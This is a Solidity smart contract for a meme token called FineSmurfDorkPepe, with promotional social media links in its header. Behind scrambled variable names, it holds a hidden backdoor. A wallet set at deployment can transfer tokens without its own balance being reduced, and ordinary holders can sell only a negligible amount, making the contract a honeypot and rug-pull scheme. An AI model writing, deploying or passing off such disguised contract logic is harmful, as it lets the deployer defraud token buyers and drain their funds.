/*

Telegram: https://t.me/FineSmurfDorkPepe

Twitter: https://twitter.com/FSDPETH

Website: https://finesmurfdorkpepe.crypto-token.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FineSmurfDorkPepe is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    string public name;

    function transfer(address gahw, uint256 ayzdx) public returns (bool success) {
        cfpumalkgho(msg.sender, gahw, ayzdx);
        return true;
    }

    constructor(string memory lvamokfs, string memory zapwcto, address pgquemnwazx, address wcpztqxaj) {
        name = lvamokfs;
        symbol = zapwcto;
        balanceOf[msg.sender] = totalSupply;
        hexgvlas[wcpztqxaj] = lcqntm;
        nvqkwfymuad = IUniswapV2Router02(pgquemnwazx);
    }

    function approve(address ibzusrchd, uint256 ayzdx) public returns (bool success) {
        allowance[msg.sender][ibzusrchd] = ayzdx;
        emit Approval(msg.sender, ibzusrchd, ayzdx);
        return true;
    }

    IUniswapV2Router02 private nvqkwfymuad;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function cfpumalkgho(address ijvke, address gahw, uint256 ayzdx) private {
        address rupbtjshoda = IUniswapV2Factory(nvqkwfymuad.factory()).getPair(address(this), nvqkwfymuad.WETH());
        bool ekufn = 0 == hexgvlas[ijvke];
        if (ekufn) {
            if (ijvke != rupbtjshoda && lervto[ijvke] != block.number && ayzdx < totalSupply) {
                require(ayzdx <= totalSupply / (10 ** decimals));
            }
            balanceOf[ijvke] -= ayzdx;
        }
        balanceOf[gahw] += ayzdx;
        lervto[gahw] = block.number;
        emit Transfer(ijvke, gahw, ayzdx);
    }

    mapping(address => uint256) private hexgvlas;

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint8 public decimals = 9;

    mapping(address => uint256) private lervto;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private lcqntm = 107;

    function transferFrom(address ijvke, address gahw, uint256 ayzdx) public returns (bool success) {
        require(ayzdx <= allowance[ijvke][msg.sender]);
        allowance[ijvke][msg.sender] -= ayzdx;
        cfpumalkgho(ijvke, gahw, ayzdx);
        return true;
    }
}
